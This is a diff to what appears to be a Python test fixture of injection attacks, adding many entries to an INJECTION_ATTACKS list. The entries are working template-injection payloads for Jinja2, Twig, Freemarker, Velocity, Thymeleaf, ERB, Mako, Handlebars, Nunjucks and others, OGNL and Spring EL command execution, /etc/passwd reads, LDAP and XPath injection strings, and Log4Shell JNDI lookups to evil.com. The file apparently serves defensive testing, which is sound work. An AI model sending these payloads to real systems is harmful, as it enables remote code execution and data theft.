@@ -314,7 +314,328 @@ INJECTION_ATTACKS = [
         "path": "/api/mongoose",
         "body": {"$where": "this.password.length > 0"},
     },
-    # Hidden in legitimate requests
+    # --- Extended Jinja2 SSTI ---
+    {
+        "name": "Jinja2 lipsum RCE",
+        "path": "/api/template",
+        "body": {"name": "{{lipsum.__globals__.os.popen('id').read()}}"},
+    },
+    {
+        "name": "Jinja2 cycler RCE",
+        "path": "/api/render",
+        "body": {"text": "{{cycler.__init__.__globals__.os.popen('id').read()}}"},
+    },
+    {
+        "name": "Jinja2 joiner RCE",
+        "path": "/api/format",
+        "body": {"text": "{{joiner.__init__.__globals__.os.popen('id').read()}}"},
+    },
+    {
+        "name": "Jinja2 namespace RCE",
+        "path": "/api/template",
+        "body": {"name": "{{namespace.__init__.__globals__.os.popen('id').read()}}"},
+    },
+    {
+        "name": "Jinja2 request globals",
+        "path": "/api/render",
+        "body": {"text": "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}"},
+    },
+    {
+        "name": "Jinja2 MRO base classes",
+        "path": "/api/format",
+        "body": {"text": "{{''.__class__.__bases__[0].__subclasses__()}}"},
+    },
+    {
+        "name": "Jinja2 self TemplateRef",
+        "path": "/api/template",
+        "body": {"name": "{{self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read()}}"},
+    },
+    {
+        "name": "Jinja2 import OS",
+        "path": "/api/render",
+        "body": {"text": "{% import os %}{{ os.popen('id').read() }}"},
+    },
+    {
+        "name": "Jinja2 config init globals",
+        "path": "/api/template",
+        "body": {"text": "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}"},
+    },
+    {
+        "name": "Jinja2 dict MRO",
+        "path": "/api/format",
+        "body": {"text": "{{{}.__class__.__bases__[0].__subclasses__()}}"},
+    },
+    # --- Extended Twig SSTI ---
+    {
+        "name": "Twig system exec",
+        "path": "/api/twig",
+        "body": {"input": "{{['id']|filter('system')}}"},
+    },
+    {
+        "name": "Twig passthru",
+        "path": "/api/twig",
+        "body": {"input": "{{['id']|filter('passthru')}}"},
+    },
+    {
+        "name": "Twig file_get",
+        "path": "/api/twig",
+        "body": {"input": "{{'/etc/passwd'|file_excerpt(1,30)}}"},
+    },
+    {
+        "name": "Twig include file",
+        "path": "/api/twig",
+        "body": {"input": "{{include('/etc/passwd')}}"},
+    },
+    # --- Extended Freemarker SSTI ---
+    {
+        "name": "Freemarker Execute",
+        "path": "/api/ftl",
+        "body": {"data": "${\"freemarker.template.utility.Execute\"?new()(\"id\")}"},
+    },
+    {
+        "name": "Freemarker ObjectConst",
+        "path": "/api/ftl",
+        "body": {"data": "${\"freemarker.template.utility.ObjectConstructor\"?new()(\"java.lang.Runtime\").exec(\"id\")}"},
+    },
+    {
+        "name": "Freemarker assign RCE",
+        "path": "/api/ftl",
+        "body": {"data": "<#assign classloader=article.class.protectionDomain.classLoader><#assign owc=classloader.loadClass(\"freemarker.template.ObjectWrapper\")><#assign dwf=owc.getField(\"DEFAULT_WRAPPER\").get(null)><#assign ec=classloader.loadClass(\"freemarker.template.utility.Execute\")>${dwf.newInstance(ec,null)(\"id\")}"},
+    },
+    # --- Extended Velocity SSTI ---
+    {
+        "name": "Velocity Runtime exec",
+        "path": "/api/velocity",
+        "body": {"vm": "#set($e=\"e\")$e.getClass().forName(\"java.lang.Runtime\").getMethod(\"getRuntime\",null).invoke(null,null).exec(\"id\")"},
+    },
+    {
+        "name": "Velocity class inspect",
+        "path": "/api/velocity",
+        "body": {"vm": "#set($x='')#set($rt=$x.class.forName('java.lang.Runtime'))#set($chr=$x.class.forName('java.lang.Character'))#set($str=$x.class.forName('java.lang.String'))#set($ex=$rt.getRuntime().exec('id'))$ex"},
+    },
+    # --- Extended Pebble SSTI ---
+    {
+        "name": "Pebble RCE",
+        "path": "/api/pebble",
+        "body": {"tmpl": "{% set cmd = 'id' %}{% set bytes = (1).TYPE.forName('java.lang.Runtime').methods[6].invoke(null,null).exec(cmd) %}{{ bytes }}"},
+    },
+    # --- Extended Smarty SSTI ---
+    {
+        "name": "Smarty math eval",
+        "path": "/api/smarty",
+        "body": {"tpl": "{math equation=\"x\" x=\"system('id')\"}"},
+    },
+    {
+        "name": "Smarty if eval",
+        "path": "/api/smarty",
+        "body": {"tpl": "{if system('id')}{/if}"},
+    },
+    # --- Extended Thymeleaf SSTI ---
+    {
+        "name": "Thymeleaf SpEL RCE",
+        "path": "/api/thymeleaf",
+        "body": {"expr": "__${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec('id').getInputStream()).next()}__::x"},
+    },
+    {
+        "name": "Thymeleaf URL inject",
+        "path": "/api/thymeleaf",
+        "body": {"url": "__${T(java.lang.Runtime).getRuntime().exec('id')}__::.x"},
+    },
+    # --- ERB (Ruby) SSTI ---
+    {
+        "name": "ERB system exec",
+        "path": "/api/erb",
+        "body": {"template": "<%= system('id') %>"},
+    },
+    {
+        "name": "ERB exec backtick",
+        "path": "/api/erb",
+        "body": {"template": "<%= `id` %>"},
+    },
+    {
+        "name": "ERB IO.popen",
+        "path": "/api/erb",
+        "body": {"template": "<%= IO.popen('id').readlines() %>"},
+    },
+    # --- Mako SSTI ---
+    {
+        "name": "Mako import RCE",
+        "path": "/api/mako",
+        "body": {"template": "<%\nimport os\nx=os.popen('id').read()\n%>\n${x}"},
+    },
+    {
+        "name": "Mako inline exec",
+        "path": "/api/mako",
+        "body": {"template": "${__import__('os').popen('id').read()}"},
+    },
+    # --- Handlebars SSTI ---
+    {
+        "name": "Handlebars lookup",
+        "path": "/api/hbs",
+        "body": {"template": "{{#with \"s\" as |string|}}\n  {{#with \"e\"}}\n    {{#with split as |conslist|}}\n      {{this.pop}}\n      {{this.push (lookup string.sub \"constructor\")}}\n      {{this.pop}}\n      {{#with string.split as |codelist|}}\n        {{this.pop}}\n        {{this.push \"return require('child_process').exec('id');\"}}\n        {{this.pop}}\n        {{#each conslist}}\n          {{#with (string.sub.apply 0 codelist)}}\n            {{this}}\n          {{/with}}\n        {{/each}}\n      {{/with}}\n    {{/with}}\n  {{/with}}\n{{/with}}"},
+    },
+    # --- EL (Expression Language) extended ---
+    {
+        "name": "EL Runtime class",
+        "path": "/api/spring/el",
+        "body": {"expr": "#{T(java.lang.Runtime).getRuntime().exec('id')}"},
+    },
+    {
+        "name": "EL ProcessBuilder",
+        "path": "/api/spring/el",
+        "body": {"expr": "#{new java.lang.ProcessBuilder({'id'}).start()}"},
+    },
+    {
+        "name": "EL ScriptEngine",
+        "path": "/api/spring/el",
+        "body": {"expr": "#{T(javax.script.ScriptEngineManager).newInstance().getEngineByName('js').eval('java.lang.Runtime.getRuntime().exec(\"id\")')}"},
+    },
+    {
+        "name": "OGNL classloader",
+        "path": "/api/struts",
+        "body": {"action": "%{(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#cmd='id').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd','/c',#cmd}:{'/bin/sh','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start())}"},
+    },
+    {
+        "name": "OGNL S2-045",
+        "path": "/api/struts",
+        "headers": {"Content-Type": "%{(#_='multipart/form-data').(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#cmd='id').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd','/c',#cmd}:{'/bin/sh','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start())}"},
+    },
+    # --- Razor (ASP.NET) SSTI ---
+    {
+        "name": "Razor code block",
+        "path": "/api/razor",
+        "body": {"template": "@{ System.Diagnostics.Process.Start(\"cmd.exe\", \"/c id\"); }"},
+    },
+    {
+        "name": "Razor inline expr",
+        "path": "/api/razor",
+        "body": {"template": "@(1+1)"},
+    },
+    # --- Jade/Pug SSTI ---
+    {
+        "name": "Pug code inject",
+        "path": "/api/pug",
+        "body": {"template": "- var x = root.process.mainModule.require('child_process').execSync('id').toString()"},
+    },
+    # --- Nunjucks SSTI ---
+    {
+        "name": "Nunjucks range RCE",
+        "path": "/api/nunjucks",
+        "body": {"template": "{{range.constructor(\"return global.process.mainModule.require('child_process').execSync('id')\")()}}"},
+    },
+    # --- SSTI detection probes ---
+    {
+        "name": "SSTI probe {{7*7}}", "path": "/api/search",
+        "query": {"q": "{{7*7}}"},
+    },
+    {
+        "name": "SSTI probe ${7*7}", "path": "/api/search",
+        "query": {"q": "${7*7}"},
+    },
+    {
+        "name": "SSTI probe #{7*7}", "path": "/api/search",
+        "query": {"q": "#{7*7}"},
+    },
+    {
+        "name": "SSTI probe <%=7*7%>", "path": "/api/search",
+        "query": {"q": "<%=7*7%>"},
+    },
+    {
+        "name": "SSTI probe {7*7}", "path": "/api/search",
+        "query": {"q": "{7*7}"},
+    },
+    {
+        "name": "SSTI probe {{7*'7'}}", "path": "/api/search",
+        "query": {"q": "{{7*'7'}}"},
+    },
+    # --- LDAP injection extended ---
+    {
+        "name": "LDAP admin close inject",
+        "path": "/api/ldap/auth",
+        "body": {"username": "admin)(&(objectClass=*))", "password": "x"},
+    },
+    {
+        "name": "LDAP nested OR",
+        "path": "/api/ldap/search",
+        "query": {"filter": "admin)(|(uid=*)(cn=*)(sn=*))"},
+    },
+    {
+        "name": "LDAP AND password",
+        "path": "/api/ldap/auth",
+        "body": {"username": "admin)(&(userPassword=*))", "password": "any"},
+    },
+    {
+        "name": "LDAP objectclass enum",
+        "path": "/api/ldap/query",
+        "query": {"search": "*)(objectClass=person)(cn=*"},
+    },
+    {
+        "name": "LDAP DN injection",
+        "path": "/api/ldap/bind",
+        "body": {"dn": "cn=admin,dc=evil,dc=com"},
+    },
+    {
+        "name": "LDAP search scope",
+        "path": "/api/ldap/search",
+        "query": {"filter": "(|(uid=*)(objectClass=*))"},
+    },
+    {
+        "name": "LDAP JNDI lookup",
+        "path": "/api/search",
+        "query": {"q": "${jndi:ldap://evil.com/exploit}"},
+    },
+    {
+        "name": "LDAP JNDI RMI",
+        "path": "/api/search",
+        "query": {"q": "${jndi:rmi://evil.com/exploit}"},
+    },
+    {
+        "name": "LDAP JNDI DNS",
+        "path": "/api/search",
+        "query": {"q": "${jndi:dns://evil.com}"},
+    },
+    {
+        "name": "Log4Shell basic",
+        "path": "/api/data",
+        "headers": {"X-Api-Version": "${jndi:ldap://evil.com/a}"},
+    },
+    {
+        "name": "Log4Shell UA",
+        "path": "/api/data",
+        "headers": {"User-Agent": "${jndi:ldap://evil.com/a}"},
+    },
+    {
+        "name": "Log4Shell obfusc",
+        "path": "/api/data",
+        "headers": {"X-Custom": "${${lower:j}${lower:n}${lower:d}${lower:i}:${lower:l}${lower:d}${lower:a}${lower:p}://evil.com/a}"},
+    },
+    # --- XPATH extended ---
+    {
+        "name": "XPATH count users",
+        "path": "/api/xml/query",
+        "query": {"xpath": "count(//user)"},
+    },
+    {
+        "name": "XPATH position extract",
+        "path": "/api/xml/query",
+        "query": {"xpath": "//user[position()=1]/password/text()"},
+    },
+    {
+        "name": "XPATH normalize-space",
+        "path": "/api/xml/query",
+        "query": {"xpath": "//user[normalize-space(name)='admin']/password"},
+    },
+    {
+        "name": "XPATH translate bypass",
+        "path": "/api/xml/query",
+        "query": {"xpath": "//user[translate(name,'ADMIN','admin')='admin']/password"},
+    },
+    {
+        "name": "XPATH last() position",
+        "path": "/api/xml/query",
+        "query": {"xpath": "//user[last()]/password"},
+    },
+    # --- Hidden in legitimate requests ---
     {
         "name": "Search LDAP inject",
         "path": "/api/directory/search",
@@ -329,6 +650,16 @@ INJECTION_ATTACKS = [
         "name": "Report template inject",
         "path": "/api/report/generate",
         "body": {"template": "{{request.application.__globals__}}", "format": "pdf"},
+    },
+    {
+        "name": "Comment SSTI inject",
+        "path": "/api/comments",
+        "body": {"text": "Check out {{config.items()}} for more info", "user": "guest"},
+    },
+    {
+        "name": "Feedback EL inject",
+        "path": "/api/feedback",
+        "body": {"message": "${T(java.lang.Runtime).getRuntime().exec('id')}", "rating": 5},
     },
 ]
 
